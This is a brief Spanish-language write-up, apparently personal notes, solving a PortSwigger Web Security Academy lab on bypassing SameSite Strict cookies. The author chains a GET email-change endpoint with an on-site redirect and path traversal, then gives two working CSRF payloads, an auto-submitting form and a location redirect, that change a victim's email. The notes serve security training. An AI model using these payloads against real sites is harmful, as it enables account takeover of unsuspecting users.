
## Objetivo:

![[Pasted image 20240519225208.png]]

## Solucion:


Al parecer el cambio de correo tambien se podia hacer por GET, pero no podia las podia pasar por GET ni POST ya que estan en ***Strict Mode***, para solucionar eso lo que hice fue aprovechar un redireccionamiento que tenia la pagina, y asi pude combinar el fallo del cambio de correo por GET con el redireccionamiento de una ruta para que **El Sitio Web** se envie la solicitud a si misma...

![[Pasted image 20240519225345.png]]

```
<body>

<form action="https://0a2b006c03f5a41d80be3a40002000da.web-security-academy.net/post/comment/confirmation/" method="get">

<input type="hidden" name="postId" value="../my-account/change-email?email=pwned%40easy.com&submit=1" />

</form>

  

<script>

document.forms[0].submit()

</script>

</body>

  

<!-- Otra solucion -->

<body>

<script>

document.location.href = 'https://0a2b006c03f5a41d80be3a40002000da.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40gmail.com&submit=1'

</script>

</body>
```

